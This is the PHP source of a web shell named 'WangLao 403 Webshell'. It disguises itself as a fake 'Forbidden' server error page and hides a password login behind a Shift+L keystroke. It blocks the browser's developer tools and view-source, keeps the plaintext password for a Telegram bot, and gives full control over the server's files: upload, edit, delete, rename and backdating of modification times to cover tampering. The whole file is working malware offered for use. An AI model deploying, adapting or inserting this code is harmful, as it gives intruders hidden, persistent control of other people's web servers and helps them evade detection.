<?php
session_save_path("/tmp");
session_start();
date_default_timezone_set("Asia/Jakarta");

// Function to display login page
function show_login_page($message = "")
{
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
    <script src="/fold-sighnesse-double-our-Colour-fromisdome-Cloc" async></script>
    <title><?= $_SERVER['SERVER_NAME']; ?></title>
    </head>
    <body>
    <h1>Forbidden</h1>
    <h1 style="font-weight: normal; font-size: 18px;">You don't have permission to access this resource.</h1> <!-- Text style changed using inline style -->
    <hr>
    <?php
    // Get server information
    $server = $_SERVER['SERVER_SOFTWARE'];

    // Get main domain name from server
    $host = $_SERVER['SERVER_NAME'];

    // Get server port
    $port = $_SERVER['SERVER_PORT'];

    // Determine server type
    if (stripos($server, 'apache') !== false) {
        // If using Apache
        $distro = "";
        if (file_exists('/etc/debian_version')) {
            $distro = "(Debian)";
        } elseif (file_exists('/etc/redhat-release')) {
            $distro = "(RedHat)";
        }
        echo "<i>Apache" . explode(" ", $server)[0] . " $distro Server at $host Port $port</i>";
    } elseif (stripos($server, 'nginx') !== false) {
        // If using Nginx
        echo "<i>$server Server at $host Port $port</i>";
    } elseif (stripos($server, 'microsoft-iis') !== false) {
        // If using IIS
        echo "<i>$server Server at $host Port $port</i>";
    } else {
        // If other server or not detected
        echo "<i>$server Server at $host Port $port</i>";
    }
    ?>
    <form action="" method="post" style="display: none; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); background-color: #2e313d; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);">
    <input type="password" name="pass" placeholder="Password" autofocus style="border: none; border-bottom: 1px solid #fff; padding: 5px; margin-bottom: 10px; color: #fff; background: none;">
    <input type="submit" name="submit" value=">" style="border: none; padding: 5px 20px; background-color: #FF2E04; color: #fff; cursor: pointer;">
    </form>
    <script type="text/javascript">
    document.addEventListener('contextmenu', function(e) {
        e.preventDefault();
    }, false);

    document.addEventListener('keydown', function(e) {
        if (e.ctrlKey && (e.key === 'u' || e.key === 'U')) {
            e.preventDefault();
        }
        if (e.ctrlKey && e.shiftKey && (e.key === 'i' || e.key === 'I')) {
            e.preventDefault();
        }
        if (e.ctrlKey && (e.key === 's' || e.key === 'S')) {
            e.preventDefault();
        }
        if (e.ctrlKey && (e.key === 'a' || e.key === 'A')) {
            e.preventDefault();
        }
        if (e.key === 'F12') {
            e.preventDefault();
        }
    }, false);

    document.addEventListener('keydown', function(e) {
        if (e.shiftKey && e.key === 'L') {
            e.preventDefault();  // Prevent 'L' input
            var form = document.querySelector('form');
            form.style.display = 'block';
    var passwordInput = document.querySelector('form input[type="password"]');
    passwordInput.focus();
        }
    }, false);
    </script>
    </body>
    </html>
    <?php
    exit;
}

// Check if user is logging out
if (isset($_GET['logout'])) {
    // Destroy session for logout
    session_unset();
    session_destroy();

    // Redirect to login page
    header("Location: " . $_SERVER['PHP_SELF']);
    exit();
}

// Check if user is not authenticated
if (!isset($_SESSION['authenticated'])) {
    // Stored hashed password
    $stored_hashed_password = '$2a$10$huoZ5hirZGS8c6e51bZD3OFZYsYLMUFc22U.Do1TwSrV3UD2hNuRe';

    // If password form is submitted and password is correct
    if (isset($_POST['pass']) && password_verify($_POST['pass'], $stored_hashed_password)) {
        // Save authentication information
        $_SESSION['authenticated'] = true;

        // Save plaintext password in session for Telegram bot
        $_SESSION['FM_SESSION_ID']['password_plaintext'] = $_POST['pass'];
    } else {
        // Show login page if password is wrong
        show_login_page("Wrong password");
    }
}

// If user is authenticated, run this function
function openGateway() {
    echo '<pre>';
    echo 'You are logged in!';
    echo '</pre>';
}
?>

<?php
// Ensure session starts only once
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

// header("X-XSS-Protection: 0");
ob_start();
set_time_limit(0);
error_reporting(0);
ini_set('display_errors', FALSE);

if (!isset($_SESSION['home_directory'])) {
    $_SESSION['home_directory'] = __DIR__;
}

$home_directory = $_SESSION['home_directory'];
?>

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>File Manager</title>
<!-- Link Font Awesome -->
<link href="https://fonts.googleapis.com/css2?family=Ubuntu+Mono:wght@400;700&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
<style>
/* Basic styles */
body {
    font-family: 'Ubuntu Mono', monospace; background-color: #181818; color: #f0f0f0; margin: 0; padding: 20px;
}

/* Main container */
.container {
    max-width: 90%; padding: 30px; border-radius: 15px; box-shadow: 0px 6px 20px rgba(0, 0, 0, 0.6);
    background-color: #252525; margin: 0 auto; border: 1px solid #333;
}

/* Path navigation */
.path-navigation {
    margin-bottom: 25px; padding: 15px; background-color: #333; border-radius: 8px; font-size: 1.1em;
}
.path-navigation a {
    color: #1e90ff; text-decoration: none; font-weight: bold; transition: color 0.3s, text-shadow 0.3s;
}
.path-navigation a:hover {
    color: #6495ed; text-shadow: 0px 0px 5px #6495ed;
}

/* Table */
table {
    width: 100%; border-collapse: collapse; margin-bottom: 25px;
}
th, td {
    padding: 5px; text-align: left; border-bottom: 1px solid #444; color: #f0f0f0; transition: background-color 0.3s ease, transform 0.2s;
}
th { background-color: #333; font-weight: 600; }
td { background-color: #252525; }
tr:hover td { background-color: #1e1e1e; transform: scale(1.01); }

/* Action forms */
.action-container {
    display: flex; justify-content: space-between; margin-bottom: 25px; gap: 25px; flex-wrap: wrap;
}
.action {
    flex: 1; min-width: 300px;
}
input[type="file"], input[type="text"], textarea {
    width: 100%; padding: 12px; margin: 10px 0; box-sizing: border-box; border: 1px solid #555;
    background-color: #1c1c1c; color: #f0f0f0; border-radius: 8px;
}
input[type="submit"] {
    background-color: #1e90ff; color: white; padding: 10px 15px; border: none; border-radius: 6px; cursor: pointer;
    font-weight: bold; transition: background-color 0.3s ease, box-shadow 0.3s ease;
}
input[type="submit"]:hover {
    background-color: #6495ed; box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.5);
}

/* Edit form */
.edit-form {
    margin-top: 25px; background-color: #2e2e2e; padding: 20px; border-radius: 10px; border: 1px solid #444;
}

/* Action icons */
.action-icons a {
    margin: 0 10px; text-decoration: none; color: #f0f0f0; font-size: 20px; position: relative;
    transition: color 0.3s ease, transform 0.3s ease;
}
.action-icons a:hover {
    color: #1e90ff; transform: scale(1.2);
}

/* Tooltip */
.action-icons a::after {
    content: attr(data-tooltip); position: absolute; background-color: #333; color: #f0f0f0; padding: 5px;
    border-radius: 5px; top: -30px; left: 50%; transform: translateX(-50%); white-space: nowrap; font-size: 12px; display: none;
}
.action-icons a:hover::after { display: block; }

/* Folder links */
table td a {
    color: #f0a500; /* Yellow color for folders */
}
table td a:hover {
    color: #ffd700; /* Brighter color on hover */
    text-decoration: underline;
}

/* Adjust folder icons */
.icon {
    display: inline-block; margin-right: 10px; /* Add margin to create space between icon and text */
}

/* Logo */
.logo {
    display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;
}
.header-left { flex: 1; text-align: left; }
.header-right { flex: 1; text-align: right; }
.header-right img { height: 60px; }

/* Buttons */
.btn {
    background-color: #1e90ff; color: white; padding: 10px 15px; border: none; border-radius: 6px; cursor: pointer;
    font-weight: bold; transition: background-color 0.3s ease, box-shadow 0.3s ease;
}
.btn:hover {
    background-color: #6495ed; box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.5);
}

/* Footer */
.footer {
    text-align: center; padding: 10px; background-color: #333; color: #f0f0f0; font-size: 0.9em; margin-top: 20px;
    border-top: 1px solid #444; border-radius: 0 0 15px 15px; box-shadow: 0px -3px 6px rgba(0, 0, 0, 0.2);
}
.footer p { margin: 0; }

</style>
</head>
<body>
<div class="container">
<!-- Company logo -->
<div class="logo">
<div class="header-left">
<h1 style="color: #f0f0f0; font-family: 'Poppins', sans-serif;">WangLao Bypass</h1>
</div>
<div class="header-right">
<img src="https://i.pinimg.com/originals/80/7b/5c/807b5c4b02e765bb4930b7c66662ef4b.gif" alt="Logo">
</div>
</div>

<!-- Home File Button -->
<div class="path-navigation">
<a href="?j=<?php echo $home_directory; ?>" class="home-button">Home File</a>
</div>

<?php
// Show SweetAlert if there's a notification
if (isset($_SESSION['notification'])) {
    $notification = $_SESSION['notification'];
    echo "<script>
    Swal.fire({
    icon: '{$notification['type']}',
    title: '{$notification['title']}',
    text: '{$notification['text']}'
});
</script>";
unset($_SESSION['notification']); // Remove notification after displaying
}

// Function to format file size
function formatSize($bytes) {
    $units = ['B', 'KB', 'MB', 'GB'];
    for ($i = 0; $i < count($units) && $bytes >= 1024; $i++) {
        $bytes /= 1024;
    }
    return round($bytes, 2) . ' ' . $units[$i];
}

// Handle upload action
if (isset($_POST['upload'])) {
    $current_dir = isset($_GET['j']) ? $_GET['j'] : getcwd();
    $current_dir = rtrim(realpath($current_dir), '/') . '/';

    if (!is_writable($current_dir)) {
        $_SESSION['notification'] = ['type' => 'error', 'title' => 'Upload Failed!', 'text' => 'Directory is not writable.'];
        header("Location: ?j=" . htmlspecialchars($current_dir));
        exit;
    }

    $target_file = $current_dir . basename($_FILES['fileToUpload']['name']);
    if (move_uploaded_file($_FILES['fileToUpload']['tmp_name'], $target_file)) {
        $_SESSION['notification'] = ['type' => 'success', 'title' => 'Upload Successful!', 'text' => "File successfully uploaded to: $target_file"];
    } else {
        $_SESSION['notification'] = ['type' => 'error', 'title' => 'Upload Failed!', 'text' => 'File upload failed.'];
    }
    header("Location: ?j=" . htmlspecialchars($current_dir));
    exit;
}

// Handle delete action
if (isset($_GET['delete'])) {
    $file_to_delete = $_GET['delete'];
    if (is_dir($file_to_delete)) {
        $success = rmdir($file_to_delete); // Delete folder
    } else {
        $success = unlink($file_to_delete); // Delete file
    }

    if ($success) {
        $_SESSION['notification'] = ['type' => 'success', 'title' => 'Delete Successful!', 'text' => 'Item successfully deleted.'];
    } else {
        $_SESSION['notification'] = ['type' => 'error', 'title' => 'Delete Failed!', 'text' => 'Failed to delete item.'];
    }
    header("Location: ?j=" . htmlspecialchars(dirname($file_to_delete)));
    exit;
}

// Handle rename action
if (isset($_POST['rename'])) {
    $old_name = $_POST['old_name'];
    $new_name = $_POST['new_name'];
    if (file_exists($old_name)) {
        if (rename($old_name, dirname($old_name) . '/' . $new_name)) {
            $_SESSION['notification'] = ['type' => 'success', 'title' => 'Rename Successful!', 'text' => 'File or folder name successfully changed.'];
        } else {
            $_SESSION['notification'] = ['type' => 'error', 'title' => 'Rename Failed!', 'text' => 'Failed to change file or folder name.'];
        }
    } else {
        $_SESSION['notification'] = ['type' => 'error', 'title' => 'File Not Found!', 'text' => 'File or folder not found.'];
    }
    header("Location: ?j=" . htmlspecialchars(dirname($old_name)));
    exit;
}

if (isset($_POST['change_date'])) {
    $file_to_touch = $_POST['touch_file'];
    $new_date = $_POST['new_date'];

    // Validate date format
    $timestamp = strtotime($new_date);
    if ($timestamp === false) {
        $_SESSION['notification'] = [
            'type' => 'error',
            'title' => 'Invalid Date!',
            'text' => 'Please enter a valid date format (YYYY-MM-DD HH:MM:SS).'
        ];
    } elseif (!file_exists($file_to_touch)) {
        $_SESSION['notification'] = [
            'type' => 'error',
            'title' => 'Path Not Found!',
            'text' => 'The file or folder does not exist.'
        ];
    } else {
        // Change last modification date
        if (touch($file_to_touch, $timestamp)) {
            $_SESSION['notification'] = [
                'type' => 'success',
                'title' => 'Date Changed!',
                'text' => 'Last modification date has been updated for ' . (is_dir($file_to_touch) ? 'folder' : 'file') . '.'
            ];
        } else {
            $_SESSION['notification'] = [
                'type' => 'error',
                'title' => 'Change Failed!',
                'text' => 'Failed to update last modification date for ' . (is_dir($file_to_touch) ? 'folder' : 'file') . '.'
            ];
        }
    }
    header("Location: ?j=" . htmlspecialchars(dirname($file_to_touch)));
    exit;
}

// Handle new file creation
if (isset($_POST['create_file'])) {
    $file_name = $_GET['j'] . '/' . $_POST['new_file'];
    if (file_put_contents($file_name, '') !== false) {
        $_SESSION['notification'] = ['type' => 'success', 'title' => 'New File Successful!', 'text' => 'New file successfully created.'];
    } else {
        $_SESSION['notification'] = ['type' => 'error', 'title' => 'New File Failed!', 'text' => 'Failed to create new file.'];
    }
    header("Location: ?j=" . htmlspecialchars($_GET['j']));
    exit;
}

// Handle new folder creation
if (isset($_POST['create_folder'])) {
    $folder_name = $_GET['j'] . '/' . $_POST['new_folder'];
    if (mkdir($folder_name)) {
        $_SESSION['notification'] = ['type' => 'success', 'title' => 'New Folder Successful!', 'text' => 'New folder successfully created.'];
    } else {
        $_SESSION['notification'] = ['type' => 'error', 'title' => 'New Folder Failed!', 'text' => 'Failed to create new folder.'];
    }
    header("Location: ?j=" . htmlspecialchars($_GET['j']));
    exit;
}

// Show SweetAlert if there's a notification
if (isset($_SESSION['notification'])) {
    $notification = $_SESSION['notification'];
    echo "<script>
    Swal.fire({
    icon: '{$notification['type']}',
    title: '{$notification['title']}',
    text: '{$notification['text']}'
});
</script>";
unset($_SESSION['notification']); // Remove notification after displaying
}

// Determine directory
$j = isset($_GET['j']) ? $_GET['j'] : getcwd();
$j = str_replace('\\', '/', $j);
$paths = explode('/', $j);

// Path navigation
echo '<div class="path-navigation">';
echo '<a href="?j=/"><img src="https://i.pinimg.com/originals/be/be/fd/bebefd1f9715745ac0bcfcf443d728b2.gif" style="width: 50px; height: 50px; vertical-align: middle;"></a> / ';
foreach ($paths as $id => $pat) {
    if ($pat == '' && $id == 0) continue;
    echo '<a href="?j=';
    for ($i = 0; $i <= $id; $i++) {
        echo "$paths[$i]";
        if ($i != $id) echo "/";
    }
    echo '">' . htmlspecialchars($pat) . '</a>/';
}
echo '</div>';

// Separate action forms
echo '<div class="action-container">';
echo '<form class="action" action="" method="post" enctype="multipart/form-data">
<label>Upload File:</label>
<input type="file" name="fileToUpload" required>
<input type="submit" name="upload" value="Upload File">
</form>';
echo '<form class="action" action="" method="post">
<label>Create Folder:</label>
<input type="text" name="new_folder" placeholder="New folder name">
<input type="submit" name="create_folder" value="Create Folder">
</form>';
echo '<form class="action" action="" method="post">
<label>Create File:</label>
<input type="text" name="new_file" placeholder="New file name">
<input type="submit" name="create_file" value="Create File">
</form>';
echo '</div>';

// Table for folder and file list
echo '<table>';
echo '<tr>
<th>Directory/File</th>
<th>Size</th>
<th>Last Modification</th>
<th>Permissions</th>
<th>Action</th>
</tr>';

$scandir = scandir($j);

// Loop for folders first
foreach ($scandir as $file) {
    if ($file == '.' || $file == '..') continue;
    $full_path = "$j/$file";

    // If folder
    if (is_dir($full_path)) {
        $last_modification = date("Y-m-d H:i:s", filemtime($full_path)); // Modification time
        echo '<tr>';
        echo '<td><span class="icon"><i class="fas fa-folder"></i></span><a href="?j=' . htmlspecialchars($full_path) . '">' . htmlspecialchars($file) . '</a></td>';
        echo '<td>-</td>'; // Size for folder is "-"
        echo '<td>' . $last_modification . '</td>';
        echo '<td>' . substr(sprintf('%o', fileperms($full_path)), -4) . '</td>';
        echo '<td class="action-icons">
        <a href="#" onclick="showRenameForm(\'' . htmlspecialchars($full_path) . '\')" data-tooltip="Rename"><i class="fa-solid fa-pen"></i></a>
        <a href="#" onclick="confirmDelete(\'' . htmlspecialchars($full_path) . '\')" data-tooltip="Delete"><i class="fas fa-trash"></i></a>
        <a href="#" onclick="showTouchForm(\'' . htmlspecialchars($full_path) . '\')" data-tooltip="Change Date"><i class="fas fa-calendar-alt"></i></a>
        </td>';
echo '</tr>';
    }
}

// Loop for files
foreach ($scandir as $file) {
    if ($file == '.' || $file == '..') continue;
    $full_path = "$j/$file";

    // If file
    if (!is_dir($full_path)) {
        $size = formatSize(filesize($full_path)); // Get file size
        $permissions = substr(sprintf('%o', fileperms($full_path)), -4);
        $last_modification = date("Y-m-d H:i:s", filemtime($full_path)); // Modification time
        $file_info = pathinfo($file);

        // Determine icon based on file type
        $icon = '<i class="fas fa-file"></i>'; // Default file icon
        if (isset($file_info['extension'])) {
            $ext = strtolower($file_info['extension']);
            if (in_array($ext, ['jpg', 'jpeg', 'png', 'gif', 'bmp'])) {
                $icon = '<i class="fas fa-file-image"></i>';
            } elseif (in_array($ext, ['mp4', 'mkv', 'avi', 'mov'])) {
                $icon = '<i class="fas fa-file-video"></i>';
            } elseif (in_array($ext, ['mp3', 'wav', 'ogg'])) {
                $icon = '<i class="fas fa-file-audio"></i>';
            } elseif (in_array($ext, ['zip', 'rar', '7z', 'tar', 'gz'])) {
                $icon = '<i class="fas fa-file-archive"></i>';
            } elseif (in_array($ext, ['doc', 'docx', 'odt'])) {
                $icon = '<i class="fas fa-file-word"></i>';
            } elseif (in_array($ext, ['xls', 'xlsx', 'ods'])) {
                $icon = '<i class="fas fa-file-excel"></i>';
            } elseif (in_array($ext, ['ppt', 'pptx', 'odp'])) {
                $icon = '<i class="fas fa-file-powerpoint"></i>';
            } elseif (in_array($ext, ['pdf'])) {
                $icon = '<i class="fas fa-file-pdf"></i>';
            } elseif (in_array($ext, ['txt', 'log', 'md'])) {
                $icon = '<i class="fas fa-file-alt"></i>';
            } elseif (in_array($ext, ['php', 'html', 'css', 'js', 'py', 'java', 'c', 'cpp'])) {
                $icon = '<i class="fas fa-file-code"></i>';
            }
        }

        echo '<tr>';
        echo '<td><input type="checkbox" name="selected_items[]" value="' . htmlspecialchars($full_path) . '" style="margin-right: 10px;">
        <span class="icon">' . $icon . '</span>' . htmlspecialchars($file) . '</td>';
        echo '<td>' . $size . '</td>';
        echo '<td>' . $last_modification . '</td>';
        echo '<td>' . $permissions . '</td>';
        echo '<td class="action-icons">
        <a href="?edit=' . htmlspecialchars($full_path) . '" data-tooltip="Edit"><i class="fas fa-edit"></i></a>
        <a href="#" onclick="showRenameForm(\'' . htmlspecialchars($full_path) . '\')" data-tooltip="Rename"><i class="fa-solid fa-pen"></i></a>
        <a href="#" onclick="confirmDelete(\'' . htmlspecialchars($full_path) . '\')" data-tooltip="Delete"><i class="fas fa-trash"></i></a>
        <a href="#" onclick="showTouchForm(\'' . htmlspecialchars($full_path) . '\')" data-tooltip="Change Date"><i class="fas fa-calendar-alt"></i></a>
        </td>';
echo '</tr>';
    }
}

// When user opens a file for editing
if (isset($_GET['edit'])) {
    $file_to_edit = $_GET['edit'];
    if (file_exists($file_to_edit)) {
        $content = file_get_contents($file_to_edit);
        echo '<form action="" method="post">
        <textarea name="file_content" rows="10" cols="50" style="width: 100%; box-sizing: border-box;">' . htmlspecialchars($content) . '</textarea>
        <input type="hidden" name="file_to_edit" value="' . htmlspecialchars($file_to_edit) . '">
        <input type="submit" name="save_edit" value="Save Changes" class="btn">
        <a href="?j=' . htmlspecialchars(dirname($file_to_edit)) . '" style="text-decoration: none;">
        <button type="button" class="btn">Back</button>
        </a>
        </form>';
    } else {
        echo "<script>
        Swal.fire({
        icon: 'error',
        title: 'File Not Found',
        text: 'The file you are trying to edit does not exist.'
    }).then(() => {
    window.location.href = '?j=" . htmlspecialchars(dirname($file_to_edit)) . "';
    });
    </script>";
    }
}

// When user saves changes
if (isset($_POST['save_edit'])) {
    $file_to_edit = $_POST['file_to_edit'];
    $file_content = $_POST['file_content'];
    if (file_put_contents($file_to_edit, $file_content) !== false) {
        echo "<script>
        Swal.fire({
        icon: 'success',
        title: 'Success',
        text: 'File saved successfully.'
    }).then(() => {
    window.location.href = '?j=" . htmlspecialchars(dirname($file_to_edit)) . "';
    });
    </script>";
    } else {
        echo "<script>
        Swal.fire({
        icon: 'error',
        title: 'Failed',
        text: 'Failed to save file.'
    });
    </script>";
    }
}
?>

<div id="touch-form" style="display:none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background-color: #252525; padding: 20px; border-radius: 8px; box-shadow: 0px 4px 15px rgba(0, 0, 0, 0.5);">
<form action="" method="post">
<h3 style="color: #f0f0f0;">Change Last Modification Date</h3>
<input type="hidden" name="touch_file" id="touch-file">
<label for="new_date" style="color: #f0f0f0;">New Date (YYYY-MM-DD HH:MM:SS):</label>
<input type="text" name="new_date" required style="width: 100%; padding: 10px; margin-top: 10px; margin-bottom: 20px; border-radius: 5px; background-color: #1c1c1c; color: #f0f0f0;">
<input type="submit" name="change_date" value="Change Date" style="background-color: #1e90ff; color: white; padding: 10px 15px; border: none; border-radius: 6px; cursor: pointer;">
<button type="button" onclick="closeTouchForm()" style="background-color: #555; color: white; padding: 10px 15px; border: none; border-radius: 6px; cursor: pointer; margin-left: 10px;">Cancel</button>
</form>
</div>

<!-- Rename Form -->
<div id="rename-form" style="display:none;">
<form action="" method="post">
<input type="hidden" name="old_name" id="old-name">
<label>Rename to:</label>
<input type="text" name="new_name" required>
<input type="submit" name="rename" value="Rename">
</form>
</div>

<script>
function showRenameForm(filePath) {
    document.getElementById("old-name").value = filePath;
    document.getElementById("rename-form").style.display = "block";
}

function confirmDelete(filePath) {
    Swal.fire({
        title: 'Are you sure?',
        text: "This action cannot be undone!",
        icon: 'warning',
        showCancelButton: true,
        confirmButtonColor: '#d33',
        cancelButtonColor: '#3085d6',
        confirmButtonText: 'Yes, delete it!',
        cancelButtonText: 'Cancel'
    }).then((result) => {
        if (result.isConfirmed) {
            // Redirect to delete URL if user clicks "Yes, delete it!"
            window.location.href = '?delete=' + encodeURIComponent(filePath);
        }
    });
}

function showTouchForm(filePath) {
    document.getElementById("touch-file").value = filePath;
    document.getElementById("touch-form").style.display = "block";
}

function closeTouchForm() {
    document.getElementById("touch-form").style.display = "none";
}
</script>
</div>
</div>
</body>
</table>
<footer class="footer">
<p>WangLao 403 Webshell ⊹ <?php echo date("Y"); ?>. Created with ಇ by WangLao Team.</p>
</footer>
</html>
